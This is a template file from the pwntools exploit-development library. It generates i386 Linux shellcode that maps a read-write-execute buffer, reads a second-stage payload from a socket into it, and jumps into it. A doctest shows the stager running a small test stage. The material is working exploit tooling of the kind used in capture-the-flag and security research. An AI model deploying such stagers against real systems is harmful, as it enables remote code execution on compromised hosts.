<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.i386 import push, mov %>
<% from pwnlib.shellcraft.i386.linux import syscall %>
<% from pwnlib.constants import SYS_mmap2, PROT_EXEC, PROT_WRITE, PROT_READ, MAP_ANON, MAP_PRIVATE, SYS_read %>
<%docstring>
Recives a fixed sized payload into a mmaped buffer
Useful in conjuncion with findpeer.
Args:
    sock, the socket to read the payload from.
    size, the size of the payload

Example:

    >>> stage_2 = asm(shellcraft.echo('hello') + "\n" + shellcraft.syscalls.exit(42))
    >>> p = run_assembly(shellcraft.stager(0, len(stage_2)))
    >>> for c in bytearray(stage_2):
    ...     p.write(bytearray((c,)))
    >>> p.wait_for_close()
    >>> p.poll()
    42
    >>> p.recvall()
    b'hello'

</%docstring>
<%page args="sock, size, handle_error=False, tiny=False"/>
<%
    stager = common.label("stager")
    looplabel = common.label("read_loop")
    errlabel  = common.label("error")
    mmap_size = (size + 0xfff) & ~0xfff
    rwx       = PROT_EXEC | PROT_WRITE | PROT_READ
    anon_priv = MAP_ANON | MAP_PRIVATE
%>
    ${push(sock)}
${stager}:
    ${mov('ebx', 0)}
    ${syscall(SYS_mmap2, 'ebx', mmap_size, rwx, anon_priv, -1, 'ebx')}

    pop  ebx /* socket */
    push eax /* save for: pop eax; call eax later */

/* read/recv loop */
    mov ecx, eax
    ${mov("edx", size)}
${looplabel}:
    ${syscall(SYS_read, 'ebx', 'ecx', 'edx')}
% if handle_error:
    test eax, eax
    js ${errlabel}
% endif
% if not tiny:
    add ecx, eax /* increment destination pointer */
    sub edx, eax /* decrement remaining amount */
    jnz ${looplabel}
% endif

	mov ebp, ebx
    ret /* start of mmapped buffer, ebp = socket */

% if handle_error:
${errlabel}:
    hlt
% endif
